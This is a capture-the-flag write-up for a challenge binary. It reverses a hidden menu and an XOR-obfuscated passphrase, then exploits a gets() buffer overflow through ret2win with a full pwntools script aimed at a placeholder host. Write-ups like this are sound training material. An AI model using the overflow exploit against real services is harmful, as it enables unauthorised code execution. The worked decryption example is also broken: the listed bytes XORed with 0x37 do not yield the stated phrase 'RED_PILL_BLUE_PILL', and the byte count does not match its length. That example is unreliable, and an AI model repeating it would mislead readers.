# matrix://root_access - Writeup

**Category:** Misc (Reverse Engineering + Binary Exploitation)  
**Difficulty:** Medium-Hard  
**Flag:** `WarCTF{dynamic_per_team}`

---

## Overview

This challenge combines two stages:
1. **Reverse engineering** - find a hidden menu option, recover an XOR-encrypted passphrase
2. **Binary exploitation** - classic ret2win buffer overflow via `gets()`

The binary is compiled with `-no-pie -fno-stack-protector`, making exploitation straightforward once you reach the vulnerable function.

---

## Stage 1: Reverse Engineering

### Initial Recon

```bash
$ file chall
chall: ELF 64-bit LSB executable, x86-64, not stripped (or stripped depending on build)

$ checksec chall
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
```

Key observations: No PIE, no canary, no NX - this screams buffer overflow.

### Finding the Hidden Menu

Open in Ghidra/IDA. The `main()` function calls `public_menu()` which presents three options (1, 2, 3). But the `switch` statement has a fourth branch:

```c
default:
    if (choice == 1337) {
        attempt_hidden_login();
    } else {
        puts("Invalid choice.");
    }
```

**Hidden option: enter `1337` at the menu.**

### Recovering the Access Phrase

`attempt_hidden_login()` reads user input and calls `validate_phrase()`:

```c
int validate_phrase(const char *input, int len) {
    if (len != SECRET_LEN) return 0;
    for (int i = 0; i < len; i++) {
        if ((unsigned char)(input[i] ^ XOR_KEY) != encrypted_secret[i]) {
            return 0;
        }
    }
    return 1;
}
```

The validation XORs each input byte with a constant key and compares against a stored encrypted array.

**To recover the plaintext:**
1. Find `XOR_KEY` - it's a single-byte immediate in the disassembly (e.g., `0x37`)
2. Find `encrypted_secret[]` - it's in the `.data` section
3. Compute: `plaintext[i] = encrypted_secret[i] ^ XOR_KEY`

**Example (if key=0x37 and phrase is "RED_PILL_BLUE_PILL"):**

In Ghidra, you'd see the encrypted bytes in `.data`:
```
65 72 75 68 43 7F 7E 7F 79 68 45 7D 7F 44 72 68 43 7E 7F 79
```

Python to decrypt:
```python
encrypted = [0x65, 0x72, 0x75, 0x68, 0x43, 0x7F, 0x7E, 0x7F, 0x79, 0x68,
             0x45, 0x7D, 0x7F, 0x44, 0x72, 0x68, 0x43, 0x7E, 0x7F, 0x79]
key = 0x37
plaintext = ''.join(chr(b ^ key) for b in encrypted)
print(plaintext)  # "RED_PILL_BLUE_PILL" (or whatever phrase this build uses)
```

**Note:** The phrase and key are randomized per team build. You must extract them from YOUR binary.

---

## Stage 2: Binary Exploitation

### Getting to the Vulnerable Function

After entering the correct phrase, you're in the **Morpheus Console**. Option 2 ("Send Transmission") calls `transmit()`:

```c
void transmit(void) {
    char message[64];
    puts("\n--- SECURE TRANSMISSION UPLINK ---");
    puts("Broadcast your message to the resistance:");
    printf("> ");
    fflush(stdout);
    gets(message);  // <-- classic buffer overflow, no bounds check
    puts("\nTransmission sent.");
}
```

`gets()` reads unlimited input into a 64-byte buffer. Classic stack smash.

### Finding the Win Function

Look for a function that opens `/flag.txt`. In Ghidra, search for the string "/flag.txt" and follow its xref:

```c
void become_the_one(void) {
    puts("\n=== ROOT ACCESS GRANTED ===");
    FILE *f = fopen("/flag.txt", "r");
    // ... reads and prints flag
}
```

Since the binary is compiled with `-no-pie`, this function's address is fixed. Check with:
```bash
$ objdump -t chall | grep become_the_one
00000000004016b8 g     F .text  0000007a become_the_one
```

If the binary is stripped, find it by locating the function that references the "/flag.txt" string.

### Computing the Offset

Stack layout of `transmit()`:
```
[message: 64 bytes][saved RBP: 8 bytes][return address: 8 bytes]
```

Offset to return address: `64 + 8 = 72` bytes.

### Building the Payload

```python
from pwn import *

payload = b"A" * 64      # fill buffer
payload += b"B" * 8      # overwrite saved RBP
payload += p64(0x4016b8) # overwrite return addr with become_the_one()
```

---

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *

HOST = "target.ctf.example"
PORT = 9999

# These must be extracted from YOUR binary:
SECRET_PHRASE = "RED_PILL_BLUE_PILL"  # recovered via XOR reversal
WIN_ADDR = 0x4016b8                   # become_the_one() address

io = remote(HOST, PORT)

# Step 1: Trigger hidden menu
io.recvuntil(b"Choice:")
io.sendline(b"1337")

# Step 2: Enter the recovered passphrase
io.recvuntil(b"Enter access phrase:")
io.sendline(SECRET_PHRASE.encode())

# Step 3: Select "Send Transmission"
io.recvuntil(b"Choice:")
io.sendline(b"2")
io.recvuntil(b">")

# Step 4: Overflow → ret2win
payload = b"A" * 72 + p64(WIN_ADDR)
io.sendline(payload)

# Step 5: Receive flag
io.interactive()
```

---

## Why Medium-Hard?

| Component | Difficulty Factor |
|-----------|------------------|
| Hidden menu discovery (`1337`) | Easy - basic reversing |
| XOR decryption | Easy-Medium - standard crypto pattern |
| Identifying `gets()` vuln | Easy - obvious dangerous function |
| Computing offset to RIP | Medium - requires understanding stack layout |
| Finding win function in stripped binary | Medium - string xref analysis |
| Chaining both stages together | Medium-Hard - multi-step solve requiring both RE and pwn skills |
| Per-team randomization | Prevents flag sharing; each player must do their own reversing |

The individual techniques are entry-level, but combining reverse engineering with exploitation in a single challenge, where you must complete Stage 1 before even reaching Stage 2, pushes it to Medium-Hard.

---

## Tools Used

- **Ghidra / IDA Free** - static analysis, finding hidden menu and encrypted bytes
- **pwntools** - exploit development and interaction
- **checksec** - identifying binary protections
- **Python** - XOR decryption script
